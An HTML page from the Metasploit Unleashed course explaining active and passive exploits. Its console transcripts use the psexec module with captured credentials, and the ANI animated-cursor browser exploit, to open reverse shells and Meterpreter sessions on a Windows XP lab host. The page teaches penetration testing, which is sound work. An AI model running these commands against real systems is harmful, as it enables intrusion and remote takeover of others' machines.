<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Metasploit Exploits</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Metasploit
Exploits</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">All exploits in the Metasploit
Framework will fall into two categories: active and passive.
</p>
<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="Active_Exploits">Active Exploits</span></h4>
<p style="color: rgb(0, 0, 0);">Active exploits will exploit a specific
host, run until completion, and then exit.
</p>
<dl style="color: rgb(0, 0, 0);">
  <dd>
    <ul>
      <li>Brute-force modules will exit when a shell opens from the
victim.
      </li>
      <li>Module execution stops if an error is encountered.
      </li>
      <li>You can force an active module to the background by passing
'-j' to the exploit command:
      </li>
    </ul>
  </dd>
</dl>
<p style="color: rgb(0, 0, 0);"><br>
</p>
<pre style="color: rgb(0, 0, 0);">msf exploit(ms08_067_netapi) &gt; exploit -j<br>[*] Exploit running as background job.<br>msf exploit(ms08_067_netapi) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="Active_Exploit_Example">Active Exploit Example</span></h4>
<p style="color: rgb(0, 0, 0);">The following example makes use of a
previously acquired set of
credentials to exploit and gain a reverse shell on the target system.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">msf &gt; use exploit/windows/smb/psexec<br>msf exploit(psexec) &gt; set RHOST 192.168.1.104<br>RHOST =&gt; 192.168.1.104<br>msf exploit(psexec) &gt; set PAYLOAD windows/shell/reverse_tcp<br>PAYLOAD =&gt; windows/shell/reverse_tcp<br>msf exploit(psexec) &gt; set LHOST 192.168.1.101<br>LHOST =&gt; 192.168.1.101<br>msf exploit(psexec) &gt; set LPORT 4444<br>LPORT =&gt; 4444<br>msf exploit(psexec) &gt; set SMBUSER victim<br>SMBUSER =&gt; victim<br>msf exploit(psexec) &gt; set SMBPASS s3cr3t<br>SMBPASS =&gt; s3cr3t<br>msf exploit(psexec) &gt; exploit<br><br>[*] Connecting to the server...<br>[*] Started reverse handler<br>[*] Authenticating as user 'victim'...<br>[*] Uploading payload...<br>[*] Created \hikmEeEM.exe...<br>[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.104[\svcctl] ...<br>[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.104[\svcctl] ...<br>[*] Obtaining a service manager handle...<br>[*] Creating a new service (ciWyCVEp - "MXAVZsCqfRtZwScLdexnD")...<br>[*] Closing service handle...<br>[*] Opening service...<br>[*] Starting the service...<br>[*] Removing the service...<br>[*] Closing service handle...<br>[*] Deleting \hikmEeEM.exe...<br>[*] Sending stage (240 bytes)<br>[*] Command shell session 1 opened (192.168.1.101:4444 -&gt; 192.168.1.104:1073)<br><br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="Passive_Exploits">Passive Exploits</span></h4>
<p style="color: rgb(0, 0, 0);">Passive exploits wait for incoming
hosts and exploit them as they connect.
</p>
<dl style="color: rgb(0, 0, 0);">
  <dd>
    <ul>
      <li>Passive exploits almost always focus on clients such as web
browsers, FTP clients, etc.
      </li>
      <li>They can also be used in conjunction with email exploits,
waiting for connections.
      </li>
      <li>Passive exploits report shells as they happen can be
enumerated by passing '-l' to the sessions command. Passing '-i' will
interact with a shell.
      </li>
    </ul>
  </dd>
</dl>
<p style="color: rgb(0, 0, 0);"><br>
</p>
<pre style="color: rgb(0, 0, 0);">msf exploit(ani_loadimage_chunksize) &gt; sessions -l<br><br>Active sessions<br>===============<br><br>  Id  Description  Tunnel<br>  --  -----------  ------<br>  1   Meterpreter  192.168.1.101:52647 -&gt; 192.168.1.104:4444<br><br>msf exploit(ani_loadimage_chunksize) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br>meterpreter &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="Passive_Exploit_Example">Passive Exploit Example</span></h4>
<p style="color: rgb(0, 0, 0);">The following output shows the setup to
exploit the animated cursor
vulnerability. The exploit does not fire until a victim browses to our
malicious website.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">msf &gt; use exploit/windows/browser/ani_loadimage_chunksize<br>msf exploit(ani_loadimage_chunksize) &gt; set URIPATH /<br>URIPATH =&gt; /<br>msf exploit(ani_loadimage_chunksize) &gt; set PAYLOAD windows/shell/reverse_tcp<br>PAYLOAD =&gt; windows/shell/reverse_tcp<br>msf exploit(ani_loadimage_chunksize) &gt; set LHOST 192.168.1.101<br>LHOST =&gt; 192.168.1.101<br>msf exploit(ani_loadimage_chunksize) &gt; set LPORT 4444<br>LPORT =&gt; 4444<br>msf exploit(ani_loadimage_chunksize) &gt; exploit<br>[*] Exploit running as background job.<br><br>[*] Started reverse handler<br>[*] Using URL: http://0.0.0.0:8080/<br>[*]  Local IP: http://192.168.1.101:8080/<br>[*] Server started.<br>msf exploit(ani_loadimage_chunksize) &gt;<br>[*] Attempting to exploit ani_loadimage_chunksize<br>[*] Sending HTML page to 192.168.1.104:1077...<br>[*] Attempting to exploit ani_loadimage_chunksize<br>[*] Sending Windows ANI LoadAniIcon() Chunk Size Stack Overflow (HTTP) to 192.168.1.104:1077...<br>[*] Sending stage (240 bytes)<br>[*] Command shell session 2 opened (192.168.1.101:4444 -&gt; 192.168.1.104:1078)<br><br>msf exploit(ani_loadimage_chunksize) &gt; sessions -i 2<br>[*] Starting interaction with 2...<br><br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\Documents and Settings\victim\Desktop&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Metasploit_Fundamentals"
 title="Metasploit Fundamentals">Metasploit Fundamentals</a></div>
<p style="color: rgb(0, 0, 0);"><br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Metasploit_Using_Exploits"
 title="Metasploit Using Exploits">Using Exploits</a></div>
</body>
</html>
